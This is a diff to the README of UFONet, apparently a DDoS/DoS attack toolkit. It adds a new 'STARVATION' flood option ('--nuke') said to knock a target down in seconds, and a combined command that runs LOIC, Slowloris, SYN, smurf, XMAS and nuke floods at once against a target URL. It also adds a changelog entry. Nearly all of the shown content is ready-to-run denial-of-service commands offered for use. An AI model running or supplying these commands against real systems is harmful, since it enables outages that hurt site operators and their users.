@@ -359,11 +359,16 @@ Or a XMAS ('root' required) attack that will flood your target with 'Christmas T
 
      sudo python ufonet -a http://target.com --xmas 101
 
+A STARVATION attack ('root' required) that will knock down your target in seconds, if it does not have a 
+minimum level of protection:
+
+     sudo python ufonet -a http://target.com --nuke 10000
+
 All ways could be combined, so UFONet can attack DDoS and DoS, at the same time:
 
      python ufonet -a http://target.com --loic 100 --loris 100
 
-     sudo python ufonet -a http://target.com --loic 100 --loris 100 --ufosyn 100 --spray 100 --smurf 101 --xmas 101
+     sudo python ufonet -a http://target.com --loic 100 --loris 100 --ufosyn 100 --spray 100 --smurf 101 --xmas 101 --nuke 10000
 
 ###############################
 # Updating
@@ -426,6 +431,10 @@ This will open a tab on your default browser with all features of the tool and s
 ###############################
 # Timelog
 ###############################
+
+--------------------------
+03.02.2019 : v.1.2.1
+--------------------------
 
 --------------------------
 31.12.2018 : v.1.2
